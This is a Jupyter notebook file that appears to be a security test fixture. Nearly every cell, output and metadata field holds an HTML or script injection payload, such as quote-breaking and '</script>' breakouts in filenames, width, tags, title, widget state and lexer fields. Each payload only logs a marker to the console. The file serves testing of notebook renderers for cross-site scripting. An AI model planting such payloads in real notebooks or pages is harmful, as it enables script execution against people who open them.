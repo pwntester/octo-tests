{
  "cells": [
    {
      "cell_type": "raw",
      "id": "372c2bf1",
      "metadata": {
        "trusted": true
      },
      "source": [
        "<script>console.log('raw cell')</script>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "b72e53fa",
      "metadata": {},
      "outputs": [
        {
          "output_type": "execute_result",
          "svg_filename": "\"><script>console.log(\"output.svg_filename injection\")</script>",
          "data": {
            "image/svg+xml": [
              ""
            ]
          },
          "execution_count": null,
          "metadata": {}
        }
      ],
      "source": [
        ""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "d72e53fa",
      "metadata": {},
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "image/png": [
              ""
            ]
          },
          "execution_count": null,
          "metadata": {
            "filenames": {
              "image/png": "\"><script>console.log(\"output.metadata.filenames.image/png injection\")</script>"
            }
          }
        }
      ],
      "source": [
        ""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "e72e53fa",
      "metadata": {},
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "image/png": [
              "\"><script>console.log(\"image/png output\")</script>"
            ]
          },
          "execution_count": null,
          "metadata": {}
        }
      ],
      "source": [
        ""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "f72e53fa",
      "metadata": {},
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "image/png": "[encoded data removed]"
          },
          "execution_count": null,
          "metadata": {
            "width": "><script>console.log(\"output.metadata.width png injection\")</script>"
          }
        }
      ],
      "source": [
        ""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "d72e53aa",
      "metadata": {},
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "image/jpeg": [
              ""
            ]
          },
          "execution_count": null,
          "metadata": {
            "filenames": {
              "image/jpeg": "\"><script>console.log(\"output.metadata.filenames.image/jpeg injection\")</script>"
            }
          }
        }
      ],
      "source": [
        ""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "e72e53aa",
      "metadata": {},
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "image/jpeg": [
              "\"><script>console.log(\"image/jpeg output\")</script>"
            ]
          },
          "execution_count": null,
          "metadata": {}
        }
      ],
      "source": [
        ""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "f72e53aa",
      "metadata": {},
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "image/jpeg": "[encoded data removed]"
          },
          "execution_count": null,
          "metadata": {
            "width": "><script>console.log(\"output.metadata.width jpeg injection\")</script>"
          }
        }
      ],
      "source": [
        ""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "c72e53fa",
      "metadata": {},
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "image/svg+xml": [
              "<script>console.log(\"image/svg+xml output\")</script>"
            ]
          },
          "execution_count": null,
          "metadata": {}
        }
      ],
      "source": [
        ""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "b72e53fb",
      "metadata": {},
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<script>console.log(\"text/html output\")</script>"
            ]
          },
          "execution_count": null,
          "metadata": {}
        }
      ],
      "source": [
        ""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "b72f53fb",
      "metadata": {},
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/latex": [
              "<script>console.log(\"text/latex output\")</script>"
            ]
          },
          "execution_count": null,
          "metadata": {}
        }
      ],
      "source": [
        ""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "c72f53fb",
      "metadata": {},
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "application/vnd.jupyter.widget-state+json": "\"</script><script>console.log('output.data.application/vnd.jupyter.widget-state+json injection')//"
          },
          "execution_count": null,
          "metadata": {}
        }
      ],
      "source": [
        ""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "c73f53fb",
      "metadata": {},
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "application/vnd.jupyter.widget-view+json": "\"</script><script>console.log('output.data.application/vnd.jupyter.widget-view+json injection')//"
          },
          "execution_count": null,
          "metadata": {}
        }
      ],
      "source": [
        ""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "b72e53fc",
      "metadata": {},
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/markdown": [
              "<script>console.log(\"text/markdown output\")</script>"
            ]
          },
          "execution_count": null,
          "metadata": {}
        }
      ],
      "source": [
        ""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "b72e53fd",
      "metadata": {},
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "application/javascript": [
              "console.log(\"application/javascript output\")"
            ]
          },
          "execution_count": null,
          "metadata": {}
        }
      ],
      "source": [
        ""
      ]
    },
    {
      "cell_type": "markdown",
      "id": "2d42de4a",
      "metadata": {},
      "source": [
        "<script>console.log(\"markdown cell\")</script>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "727d1a5f",
      "metadata": {
        "tags": [
          "\"><script>console.log(\"metadata.tags injection\")</script><div \""
        ]
      },
      "outputs": [],
      "source": []
    }
  ],
  "metadata": {
    "title": "TITLE</title><script>console.log(\"metadata.title injection\")</script>",
    "kernelspec": {
      "display_name": "Python 3 (ipykernel)",
      "language": "python",
      "name": "python3"
    },
    "widgets": {
      "application/vnd.jupyter.widget-state+json": {
        "foo": "pwntester</script><script>console.log('metadata.widgets injection');//"
      }
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3\"><script>console.log('metadata.language_info.pygments_lexer injection')</script><div \"",
      "version": "3.7.6"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 5
}
